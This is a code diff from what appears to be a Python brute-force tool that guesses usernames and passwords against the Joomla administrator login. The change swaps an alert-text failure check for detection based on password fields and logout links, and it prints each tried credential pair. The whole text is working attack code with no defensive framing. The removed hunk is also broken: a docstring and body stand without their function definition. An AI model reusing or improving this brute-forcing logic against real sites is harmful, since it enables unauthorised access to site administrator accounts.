@@ -472,40 +472,6 @@ def _detect_lockout(html: str) -> bool:
     return any(phrase in lower for phrase in indicators)
 
 
-    """
-    Return True if the page contains a Joomla login failure alert.
-    Inspects alert text to distinguish between actual login failures
-    and pos-login warnings (e.g. PHP version deprecated).
-    """
-    # Check for the primary failure container
-    alert = soup.find("div", {"class": "alert-message"})
-    if not alert:
-        # Also check other common classes
-        for cls in ("alert-error", "alert-danger"):
-            alert = soup.find("div", class_=cls)
-            if alert: break
-            
-    if not alert:
-        return False
-        
-    text = alert.get_text().lower()
-    
-    # Known failure phrases
-    failure_phrases = [
-        "match",      # "Username and password do not match"
-        "invalid",    # "Invalid token", "Invalid session"
-        "access denied",
-        "login denied",
-    ]
-    
-    if any(phrase in text for phrase in failure_phrases):
-        return True
-        
-    # If alert exists but doesn't match a failure phrase (e.g. PHP warning),
-    # assume success (post-login dashboard warning).
-    return False
-
-
 def _try_credential(session: requests.Session, admin_url: str,
                     username: str, password: str,
                     timeout: int, verbose: bool) -> BruteResult:
@@ -538,20 +504,36 @@ def _try_credential(session: requests.Session, admin_url: str,
         return BruteResult(username, password, locked_out=True)
 
     soup    = BeautifulSoup(resp.text, "html.parser")
-    failure = _is_login_failure(soup)
 
-    # If no 'alert-message' div found → login succeeded
-    logged_in = not failure
+    # Robust detection logic:
+    # 1. If a password input field is present, we are still on the login page -> Failed.
+    has_password_field = bool(soup.find("input", type="password"))
+    
+    # 2. If "Log Out" link/button is present -> Success.
+    has_logout = bool(soup.find("a", href=re.compile(r"logout|task=logout", re.I))) or \
+                 bool(soup.find("input", attrs={"value": "logout"}))
+
+    # Decision:
+    # - If we have a logout link, we definitely succeeded.
+    # - If we stick on the login page (password field present), we failed.
+    # - If neither (e.g. blank page?), default to failure to be safe, unless brute.py logic applies.
+    
+    if has_logout:
+        logged_in = True
+    elif has_password_field:
+        logged_in = False
+    else:
+        # Ambiguous (no password field, no logout). 
+        # Could be a weird dashboard or a WAF block.
+        # Fallback to "no error alert" check? 
+        # No, let's assume if there's no password field, we passed the gate.
+        logged_in = True
 
     if verbose and not logged_in:
-        # Debugging: show why we think it failed
-        if not token:
-            print(dim(f"    [?] CSRF missing for {username}:{password}"))
-        elif failure:
-             msg = soup.find("div", {"class": "alert-message"}).get_text().strip()[:50]
-             print(dim(f"    [x] Failed: {username}:{password} (Alert: {msg}...)"))
-        else:
-             print(dim(f"    [?] Unknown failure for {username}:{password}"))
+        # Debugging
+        alert = soup.find("div", {"class": "alert-message"})
+        alert_text = alert.get_text().strip()[:50] if alert else "No alert found"
+        print(dim(f"    [x] Failed: {username}:{password} (PwdField: {has_password_field}, Alert: {alert_text}...)"))
 
     return BruteResult(username, password, success=logged_in)
 
